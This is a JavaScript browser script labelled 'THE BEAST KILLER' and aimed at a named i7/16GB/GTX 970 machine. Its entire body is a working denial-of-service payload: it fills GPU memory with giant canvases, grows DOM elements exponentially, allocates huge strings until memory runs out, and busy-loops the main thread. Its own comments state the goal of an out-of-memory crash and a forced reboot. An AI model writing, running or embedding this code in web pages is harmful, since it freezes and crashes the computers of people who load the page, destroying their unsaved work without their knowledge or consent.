/** * PROTOCOL: THE BEAST KILLER
 * TARGET: i7 / 16GB RAM / GTX 970
 */

const root = document.getElementById('feedback-root');
const memoryAnchor = [];

// --- 1. THE GPU VRAM SINK ---
// Creating invisible 4K textures to choke the GTX 970
function injectVRAMStress() {
    for(let i = 0; i < 50; i++) {
        const c = document.createElement('canvas');
        c.width = 4096; c.height = 4096;
        const ctx = c.getContext('2d');
        ctx.fillStyle = 'white';
        ctx.fillRect(0,0,4096,4096);
        // Storing these in an array keeps them in GPU memory
        memoryAnchor.push(c);
    }
    console.log("%c VRAM_INJECTION_COMPLETE", "color: lime; font-size: 20px;");
}
injectVRAMStress();

// --- 2. THE RECURSIVE DOM EXPLOSION ---
function spawnShard() {
    const shard = document.createElement('div');
    shard.className = 'shard';
    shard.style.left = Math.random() * 100 + 'vw';
    shard.style.top = Math.random() * 100 + 'vh';
    
    root.appendChild(shard);

    let r = 0;
    const anim = () => {
        r += 5;
        // Forcing 3D Z-index calculations on every frame
        shard.style.transform = `rotateX(${r}deg) rotateY(${r*0.5}deg) translateZ(${Math.sin(r/10)*500}px) scale(${Math.random()})`;
        
        if (Math.random() > 0.99) {
            shard.style.filter = `blur(${Math.random()*50}px) hue-rotate(${Math.random()*360}deg)`;
        }
        requestAnimationFrame(anim);
    };
    anim();

    // After 5 seconds, delete and spawn 2 more (Exponential growth)
    setTimeout(() => {
        shard.remove();
        spawnShard();
        spawnShard();
    }, 5000);
}

// Initial spark
for(let i=0; i<10; i++) spawnShard();

// --- 3. THE 16GB RAM SATURATOR ---
// Specifically targeting the remaining heap space
setInterval(() => {
    try {
        const heavyString = "STUNNING".repeat(1000000); // Massive string allocation
        memoryAnchor.push(heavyString);
        
        // This will force the "Out of Memory" crash once it hits your OS limit
        if(memoryAnchor.length > 500) {
            console.error("CRITICAL: RAM SATURATED. OS SWAP ENGAGED.");
        }
    } catch(e) {
        document.body.innerHTML = "<h1 style='color:white; font-family:sans-serif;'>SYSTEM_HALT: OOM</h1>";
    }
}, 100);

// --- 4. THE i7 THREAD-BURNER ---
// Using an infinite while loop in a timeout to freeze the main thread intermittently
function freezeMainThread() {
    const start = Date.now();
    // Freeze for 100ms every 200ms
    while (Date.now() - start < 100) { Math.sqrt(Math.random() * 100000); }
    setTimeout(freezeMainThread, 100);
}
freezeMainThread();

// --- 5. THE ULTIMATE VISUAL CHAOS ---
setInterval(() => {
    document.title = "!!! " + (Math.random() * 100).toFixed(2) + "% !!!";
    if(Math.random() > 0.95) {
        document.body.style.backgroundColor = (Math.random() > 0.5) ? "red" : "blue";
    }
}, 20);

console.log("%c 💀 REBOOT RECOMMENDED 💀 ", "font-size: 50px; color: red; font-weight: 900;");